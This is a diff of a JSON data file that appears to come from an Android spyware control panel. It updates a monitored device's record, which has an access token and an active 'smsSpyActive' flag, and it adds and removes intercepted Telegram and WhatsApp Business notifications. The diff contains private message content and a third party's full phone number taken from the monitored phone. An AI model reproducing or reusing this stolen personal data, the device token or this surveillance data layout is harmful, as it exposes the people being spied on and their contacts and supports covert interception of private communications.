@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639167099,
+    "lastSeen": 1775639173277,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ㅤ ᴀ̈xᴇʟʟ",
+        "content": "Voice message",
+        "time": "08/04 16:06",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775639174505
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ㅤ ᴀ̈xᴇʟʟ",
+        "content": "Voice message",
+        "time": "08/04 16:06",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775639169348
+      },
       {
         "appName": "Telegram",
         "sender": "ㅤ ᴀ̈xᴇʟʟ",
@@ -4302,22 +4318,6 @@
         "time": "08/04 15:15",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775636138394
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "‎2 pesan baru",
-        "time": "08/04 15:15",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775636138338
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Cara nya run nya di konsole?",
-        "time": "08/04 15:15",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775636138331
       }
     ],
     "galleryPhotos": [],
